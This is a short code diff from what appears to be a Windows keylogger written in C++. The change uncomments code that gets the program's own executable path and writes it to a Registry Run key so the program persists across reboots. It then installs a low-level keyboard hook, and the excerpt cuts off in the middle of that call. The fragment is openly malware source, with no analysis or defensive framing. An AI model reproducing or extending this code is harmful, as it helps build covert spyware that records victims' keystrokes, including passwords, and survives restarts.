@@ -9,13 +9,13 @@ int main(int argc, char* argv[]) {
     Keylogger kl(L"VandeVen");
     wchar_t exePath[MAX_PATH];
 
-    // if (!getPath(exePath, MAX_PATH)) {
-    //     std::cerr << "Unable to get exe path." << std::endl;
-    // }
+    if (!getPath(exePath, MAX_PATH)) {
+        std::cerr << "Unable to get exe path." << std::endl;
+    }
 
-    // if (!WriteRegistryRun(exePath)) {
-    //     std::cerr << "Persistence via Registry Run Key failed." << std::endl;
-    // }
+    if (!WriteRegistryRun(exePath)) {
+        std::cerr << "Persistence via Registry Run Key failed." << std::endl;
+    }
 
     HHOOK hKeyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
